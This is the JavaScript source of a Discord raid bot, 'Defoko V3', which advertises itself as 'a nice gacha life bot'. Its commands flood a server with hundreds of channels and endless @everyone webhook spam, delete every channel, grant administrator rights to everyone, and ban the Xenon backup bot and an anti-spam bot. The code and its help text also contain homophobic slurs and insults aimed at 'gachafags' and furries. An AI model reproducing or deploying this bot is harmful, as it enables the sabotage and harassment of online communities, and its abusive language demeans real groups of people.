const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = '$';

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

client.on("ratelimit", () =>{
    console.log(`RATELIMIT FODA DMS`)
})

client.on("ready", () => { 
    console.log(`ready for destroy ppl's days`)
    console.log(`Defoko V3`)
    client.user.setActivity(`Defoco V3 - Prefix: $ [a nice gacha life bot]`);
});

client.on("message", async (message) => {
    if(message.author.bot) return;
    const args = message.content.slice(prefix.length).trim().split(/ +/g);
    const comando = args.shift().toLowerCase();

    const server = message.guild.channels;

    switch(comando) {
        case "yeet":
            message.delete();
            if(message.guild.channels > 500) return message.channel.send(`too much text channels`)
            let i;
            if(!args.slice(0).join(' ')){ 
                message.guild.setName('haha admin go grr -ags and gs')
                for(i = 0; i < 499; i++){
                    message.guild.createChannel('haha admin go grr', 'text').then(m =>{
                        const mch1 = message.channel.id
                        m.createWebhook("get raided faggots").then(w => {
                            const case1hook = new Discord.WebhookClient(w.id, w.token)
                            while(Boolean(client.channels.get(mch1)) == true){
                              case1hook.send(`@everyone raided epicclly by padero's private rice girl`)
                            }
                        })
                    })
                    message.guild.createChannel('haha admin go grr', 'voice')
                 }
            } else {
                message.guild.setName(`${args.slice(0).join(' ')}`)
                for(i = 0; i < 499; i++){
                    message.guild.createChannel(`${args.slice(0).join(' ')}`, 'text').then(m =>{
                        const mch2 = message.channel.id
                        m.createWebhook("get raided faggots").then(w => {
                            const case2hook = new Discord.WebhookClient(w.id, w.token)
                            while(Boolean(client.channels.get(mch2)) == true) {
                              case2hook.send(`@everyone raided epicclly by padero's private rice girl`)
                            }
                        })
                    })
                    message.guild.createChannel(`${args.slice(0).join(' ')}`, 'voice')
                }
            }
            for(i = 0; i == 250; i++) message.guild.createRole('NOOT NOOT')
        break;
        case "del":
            message.delete();
            server.deleteAll();
            message.guild.createChannel('lmaoo', 'text')
        break;
        case "admall":
            message.delete();
            message.guild.defaultRole.setPermissions(['ADMINISTRATOR']);
        break;
        case "servername":
            message.delete();
            if(!args.slice(0).join(' ')) return message.channel.send("give a name, dumbass")
            message.guild.setName(`${args.slice(0).join(' ')}`)
        break;
        case "help":
            message.delete();
            const help = [`Tefoco V3\n`,
            "prefix: $",
            "$yeet (optional name for the things)- makes a lot of text channels and vcs, and roles, changes the server's name and pings everyone on the new channels",
            "$del - yeets all the channels and only leaves one",
            "$admall - self explanatory",
            "$servername (new server name) - self explanatory",
            "$antiprotector - bans xenon (backup bot) and betterantispam",
            `$help - bruhhh\n`,
            "Bot by paradino, making gachafags and furries lifes worse"]
            message.author.send(`${help.slice(0).join(`\n`)}`).catch(() => message.channel.send(`enable yo dms dumbass`))
        break;
        case "antiprotector":
          message.delete()
          const xenonid = client.users.get(`416358583220043796`)
          const betterantispamid = client.users.get(`501982335076532224`)
          const xenon = message.channel.fetchMember(xenonid)
          const betterantispam = message.channel.fetchMember(betterantispamid)
          xenon.ban()
          betterantispam.ban()
        break;
    }
});

client.login(process.env.token);

//para de olhar aqui poha
//- mene paradino
